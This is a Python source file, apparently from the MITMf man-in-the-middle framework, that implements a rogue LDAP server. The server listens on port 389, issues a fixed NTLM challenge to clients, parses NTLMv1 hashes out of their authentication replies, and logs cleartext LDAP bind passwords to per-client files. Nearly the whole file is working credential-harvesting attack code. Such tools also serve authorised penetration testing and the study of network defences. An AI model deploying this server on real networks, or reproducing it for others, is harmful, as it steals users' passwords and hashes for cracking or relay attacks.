import struct
import logging
import threading
import re

from SocketServer import TCPServer, ThreadingMixIn, BaseRequestHandler
from LDAPPackets import *
from core.responder.common import *

mitmf_logger = logging.getLogger("mitmf")

class LDAPServer():

	def start(self, chal):
		global Challenge; Challenge = chal

		try:
			mitmf_logger.debug("[LDAPServer] online")
			server = ThreadingTCPServer(("0.0.0.0", 389), LDAP)
			t = threading.Thread(name="LDAPServer", target=server.serve_forever)
			t.setDaemon(True)
			t.start()
		except Exception as e:
			mitmf_logger.error("[LDAPServer] Error starting on port {}: {}".format(389, e))

class ThreadingTCPServer(ThreadingMixIn, TCPServer):

	allow_reuse_address = 1

	def server_bind(self):
		TCPServer.server_bind(self)

def ParseSearch(data):
	Search1 = re.search('(objectClass)', data)
	Search2 = re.search('(?i)(objectClass0*.*supportedCapabilities)', data)
	Search3 = re.search('(?i)(objectClass0*.*supportedSASLMechanisms)', data)
	if Search1:
		return str(LDAPSearchDefaultPacket(MessageIDASNStr=data[8:9]))
	if Search2:
		return str(LDAPSearchSupportedCapabilitiesPacket(MessageIDASNStr=data[8:9],MessageIDASN2Str=data[8:9]))
	if Search3:
		return str(LDAPSearchSupportedMechanismsPacket(MessageIDASNStr=data[8:9],MessageIDASN2Str=data[8:9]))

def ParseLDAPHash(data,client):
	SSPIStarts = data[42:]
	LMhashLen = struct.unpack('<H',data[54:56])[0]
	if LMhashLen > 10:
		LMhashOffset = struct.unpack('<H',data[58:60])[0]
		LMHash = SSPIStarts[LMhashOffset:LMhashOffset+LMhashLen].encode("hex").upper()
		NthashLen = struct.unpack('<H',data[64:66])[0]
		NthashOffset = struct.unpack('<H',data[66:68])[0]
		NtHash = SSPIStarts[NthashOffset:NthashOffset+NthashLen].encode("hex").upper()
		DomainLen = struct.unpack('<H',data[72:74])[0]
		DomainOffset = struct.unpack('<H',data[74:76])[0]
		Domain = SSPIStarts[DomainOffset:DomainOffset+DomainLen].replace('\x00','')
		UserLen = struct.unpack('<H',data[80:82])[0]
		UserOffset = struct.unpack('<H',data[82:84])[0]
		User = SSPIStarts[UserOffset:UserOffset+UserLen].replace('\x00','')
		writehash = User+"::"+Domain+":"+LMHash+":"+NtHash+":"+Challenge
		Outfile = "./logs/responder/LDAP-NTLMv1-"+client+".txt"
		WriteData(Outfile,writehash,User+"::"+Domain)
		#print "[LDAP] NTLMv1 complete hash is :", writehash
		mitmf_logger.info('[LDAP] NTLMv1 complete hash is :%s'%(writehash))
	if LMhashLen <2 :
		Message = '[LDAPServer] LDAP Anonymous NTLM authentication, ignoring..'
		#print Message
		mitmf_logger.info(Message)

def ParseNTLM(data,client):
	Search1 = re.search('(NTLMSSP\x00\x01\x00\x00\x00)', data)
	Search2 = re.search('(NTLMSSP\x00\x03\x00\x00\x00)', data)
	if Search1:
		NTLMChall = LDAPNTLMChallenge(MessageIDASNStr=data[8:9],NTLMSSPNtServerChallenge=Challenge)
		NTLMChall.calculate()
		return str(NTLMChall)
	if Search2:
		ParseLDAPHash(data,client)

def ParseLDAPPacket(data,client):
	if data[1:2] == '\x84':
		PacketLen = struct.unpack('>i',data[2:6])[0]
		MessageSequence = struct.unpack('<b',data[8:9])[0]
		Operation = data[9:10]
		sasl = data[20:21]
		OperationHeadLen = struct.unpack('>i',data[11:15])[0]
		LDAPVersion = struct.unpack('<b',data[17:18])[0]
		if Operation == "\x60":
			UserDomainLen = struct.unpack('<b',data[19:20])[0]
			UserDomain = data[20:20+UserDomainLen]
			AuthHeaderType = data[20+UserDomainLen:20+UserDomainLen+1]
			if AuthHeaderType == "\x80":
				PassLen = struct.unpack('<b',data[20+UserDomainLen+1:20+UserDomainLen+2])[0]
				Password = data[20+UserDomainLen+2:20+UserDomainLen+2+PassLen]
				#print '[LDAP]Clear Text User & Password is:', UserDomain+":"+Password
				outfile = "./logs/responder/LDAP-Clear-Text-Password-"+client+".txt"
				WriteData(outfile,'[LDAPServer] User: %s Password: %s'%(UserDomain,Password),'[LDAP]User: %s Password: %s'%(UserDomain,Password))
				mitmf_logger.info('[LDAPServer] User: %s Password: %s'%(UserDomain,Password))
			if sasl == "\xA3":
				buff = ParseNTLM(data,client)
				return buff
		elif Operation == "\x63":
			buff = ParseSearch(data)
			return buff
		else:
			mitmf_logger.info('[LDAPServer] Operation not supported')

#LDAP Server Class
class LDAP(BaseRequestHandler):

	def handle(self):
		try:
			while True:
				self.request.settimeout(0.5)
				data = self.request.recv(8092)
				buffer0 = ParseLDAPPacket(data,self.client_address[0])
				if buffer0:
					self.request.send(buffer0)
		except Exception:
			pass #No need to print timeout errors.
